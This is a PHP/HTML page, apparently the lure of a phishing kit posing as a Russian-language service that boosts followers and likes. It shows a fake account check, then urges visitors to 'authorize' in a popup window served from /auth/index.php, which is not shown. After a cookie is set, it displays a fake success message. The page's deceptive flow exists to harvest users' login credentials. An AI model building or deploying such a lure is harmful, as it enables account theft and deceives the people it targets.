<head>
<meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9" />
<style type="text/css" media="all">
    body{
		background-image: linear-gradient(-130deg,#6a00bc,#c50088,#f50000);
		padding: 0;
		width: 100%;
		height: 100%;
		margin: 0;
	}
	#sub{
	font-family: calibri;
    font-size: 20px;
    width: 280px;
    height: 50px;
    margin: 5px;
    color: #eee;
    border: 1px solid #eee;
    border-radius: 3px;
    background: rgba(34,34,34, .9);
    font-weight: 400;
    text-transform: uppercase;
    text-decoration: none;
    letter-spacing: 2px;
	}
	
</style>


  
      <link rel="stylesheet" href="css/style.css">
</head>
<span style="font-size: 14px;text-align:center;padding:0;position:relative;top:30px;">

<center><span style="color:white; font-size: 16px;">

       <div id="mody" style="display:none">
	   <center><span style="color:white; font-size: 16px;">Во избежании неоднократной накрутки просим авторизоваться на сайте</span></center><br>
	   
	   <br><input type="submit" value="Авторизоваться" style="cursor:pointer" id="sub">
	   </div>
	   
	   <div id="good" style="display:none"><center><br><b>Мы отправили вам немного подписчиков, лайков и комментариев! ??</b><br><br></center> </div>
	
		<!-- Page Loader -->
		<div id="page-loader" class="page-loader">
		
		<div class="loader">
		
		<?php

	if($_COOKIE['go'] == 'go') {echo "Идёт процесс накрутки, ожидайте...";} else {echo "Идёт проверка аккаунта, ожидайте...";}
?>
		
		</div>
		
		  <div class='cssload-loader'>
          <div class='cssload-inner cssload-one'></div>
  <div class='cssload-inner cssload-two'></div>
  <div class='cssload-inner cssload-three'></div>
  </div>
		
		</div>
		
		<script type="text/javascript">setTimeout(function(){$('#page-loader').fadeOut();}, 5000); </script>
		
<?php

	if($_COOKIE['go'] == 'go') {

?>

		<script type="text/javascript">setTimeout(function(){$('#good').fadeIn();}, 7500); </script>
		
		<?php
	
	}
	else
		
		{
		?>
		<script type="text/javascript">setTimeout(function(){$('#mody').fadeIn();}, 5500); </script>
		<?php
		}
?>
</span></center><br>

</span>

 <script type="text/javascript" src="/js/jquery-1.11.2.min.js"></script>
 </script>

<script>

$(document).ready(function() {

var win;

$("#sub").on("click", function() {
 win = window.open('/auth/index.php', 'Авторизация', 'width=860, height=470, top='+((screen.height-470)/2)+',left='+((screen.width-860)/2)+', resizable=no, copyhistory=no, scrollbars=no, directories=no, status=no, menubar=no');
 check();
});

function check() {
  if (win && win.closed) {
location.reload();
  }else {
   setTimeout(check, 1000);
  } 
}	

});

</script>
